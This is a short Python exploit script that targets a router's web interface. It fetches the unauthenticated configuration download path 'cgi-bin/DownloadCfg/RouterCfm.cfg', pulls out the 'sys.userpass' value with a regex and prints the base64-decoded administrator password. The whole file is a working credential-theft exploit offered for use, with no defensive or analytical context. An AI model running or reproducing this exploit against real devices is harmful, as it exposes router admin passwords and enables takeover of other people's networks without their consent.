import requests
import sys
import re
import base64

def get_info(url):
    pattern = re.compile(r'sys.userpass=[\S]+\n')
    proxies = {
        "http": "http://127.0.0.1:7890",
        "https": "https://127.0.0.1:7890"
    }
    payload = 'cgi-bin/DownloadCfg/RouterCfm.cfg'
    url_exp = url + payload
    res = requests.get(url_exp, proxies=proxies)
    if res.status_code == 200:
        html = res.text
        result = pattern.search(html)
        if result:
            result_base64 = result.group(0).replace("sys.userpass=", "").strip()
            result = base64.b64decode(result_base64).decode()
            print("The password base64: " + result_base64)
            print("The password decoded: " + result)
        else:
            print("[-] Fail! The vulnerability isn't exist!")



if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[X] Error!\n[+] Example: python exp.py http://127.0.0.1/")
    else:
        url = sys.argv[1]
        get_info(url)